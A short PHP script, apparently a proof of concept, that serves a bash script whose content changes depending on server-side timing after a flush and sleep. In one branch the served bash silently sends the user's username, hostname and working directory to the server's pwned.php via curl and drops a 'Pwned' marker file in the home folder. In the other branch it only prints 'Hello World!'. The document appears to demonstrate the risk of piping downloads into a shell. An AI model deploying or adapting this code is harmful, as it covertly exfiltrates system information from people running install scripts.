<?
header('Content-Type: text/plain; charset=UTF-8');

$baseurl = ($_SERVER['REQUEST_SCHEME'] == 'http' ? 'http://' : 'https://') . $_SERVER['HTTP_HOST'];

$id = uniqid();
?>
#!/bin/bash
curl -L <?=$baseurl; ?>/download/<?=$id;?>.tar.gz -o download.tar.gz
<?
flush();
sleep(1);
if (file_exists($id)) {
?>
curl -s -G \
    --data-urlencode "username=$(whoami)" \
    --data-urlencode "hostname=$(hostname)" \
    --data-urlencode "&pwd=$(pwd)" \
    "<?= $baseurl ?>/pwned.php" &> /dev/null
echo "!!! Pwned !!!" > ~/pwned.txt
echo "Take a look at <?= $baseurl ?>/pwned.txt" >> ~/pwned.txt
echo "!!! Pwned !!!"
echo "Take a look at ~/pwned.txt in your home folder."

<? } else { ?>
echo "Hello World!"
<?}
